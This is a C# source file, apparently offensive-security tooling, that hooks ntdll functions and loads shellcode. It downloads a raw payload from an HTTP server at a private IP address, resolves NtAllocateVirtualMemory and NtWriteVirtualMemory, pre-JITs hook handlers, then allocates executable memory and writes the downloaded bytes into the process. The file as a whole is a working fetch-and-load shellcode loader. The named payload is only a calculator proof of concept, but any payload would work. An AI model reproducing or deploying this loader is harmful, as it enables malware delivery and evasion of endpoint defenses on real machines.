using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Net;
using System.Linq.Expressions;
using System.Linq;
using System.Collections;

namespace ShittyHook
{
    internal class Program
    {
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        public static void Main()
        {
            byte[] buf = new WebClient().DownloadData("http://192.168.1.106:8000/calc.bin");

            IntPtr ntdll = default;
            foreach (ProcessModule mod in Process.GetCurrentProcess().Modules)
            {
                if (mod.ModuleName.ToLower() == "ntdll.dll")
                    ntdll = mod.BaseAddress;
            }
            IntPtr pOGAlloc = GetProcAddress(ntdll, "NtAllocateVirtualMemory");
            IntPtr pOGWrite = GetProcAddress(ntdll, "NtWriteVirtualMemory");

            Console.WriteLine(""); // Lazy JIT of print for janky functionality

            // JITTING our scanner and Marshal
            MethodInfo scan = typeof(Scanner).GetMethod(nameof(Scanner.Scan), BindingFlags.Static | BindingFlags.Public);
            RuntimeHelpers.PrepareMethod(scan.MethodHandle);

            MethodInfo check = typeof(Scanner).GetMethod(nameof(Scanner.ArrayContainsArray), BindingFlags.Static | BindingFlags.Public);
            RuntimeHelpers.PrepareMethod(check.MethodHandle);

            MethodInfo[] methods = typeof(Marshal).GetMethods();
            foreach (MethodInfo method in methods)
            {
                if (method.IsGenericMethod) continue;
                RuntimeHelpers.PrepareMethod(method.MethodHandle);
            }
                    
            // JITTING our Handler
            MethodInfo alloc = typeof(NtAllocHook).GetMethod(nameof(NtAllocHook.Handler), BindingFlags.Static | BindingFlags.Public);
            RuntimeHelpers.PrepareMethod(alloc.MethodHandle);

            MethodInfo write = typeof(NtWriteHook).GetMethod(nameof(NtWriteHook.Handler), BindingFlags.Static | BindingFlags.Public);
            RuntimeHelpers.PrepareMethod(write.MethodHandle);

            // Calling the ntallocate from ntdll, which is hooked
            NtAllocHook ntAllocHook = new NtAllocHook(pOGAlloc);
            NtWriteHook ntWriteHook = new NtWriteHook(pOGWrite);

            object[] allocArgs = { (IntPtr)(-1), IntPtr.Zero, IntPtr.Zero, (IntPtr)420420, (UInt32)0x3000, (UInt32)0x40 };
            uint ntstatus = (uint)Marshal.GetDelegateForFunctionPointer<NtAllocHook.NtAllocateVirtualMemory>(pOGAlloc).DynamicInvoke(allocArgs);

            
            object[] writeArgs = { (IntPtr)(-1), (IntPtr)allocArgs[1], GCHandle.Alloc(buf, GCHandleType.Pinned).AddrOfPinnedObject(), (UInt32)0x3000, (UInt32)0 };
            ntstatus = (uint)Marshal.GetDelegateForFunctionPointer<NtWriteHook.NtWriteVirtualMemory>(pOGWrite).DynamicInvoke(writeArgs);
           
            
            Console.WriteLine("Alloc Jump location 0x{0:X}", (long)NtAllocHook.HookData.addr);
            Console.WriteLine("Alloc source bytes 0x{0:X}", BitConverter.ToInt64(NtAllocHook.HookData.src, 0));
            Console.WriteLine("Alloc handler bytes 0x{0:X}", BitConverter.ToInt64(NtAllocHook.HookData.dst, 0));

            Console.WriteLine("Write Jump location 0x{0:X}", (long)NtWriteHook.HookData.addr);
            Console.WriteLine("Write source bytes 0x{0:X}", BitConverter.ToInt64(NtWriteHook.HookData.src, 0));
            Console.WriteLine("Write handler bytes 0x{0:X}", BitConverter.ToInt64(NtWriteHook.HookData.dst, 0));
            
            //Console.ReadKey();

        }
    }
}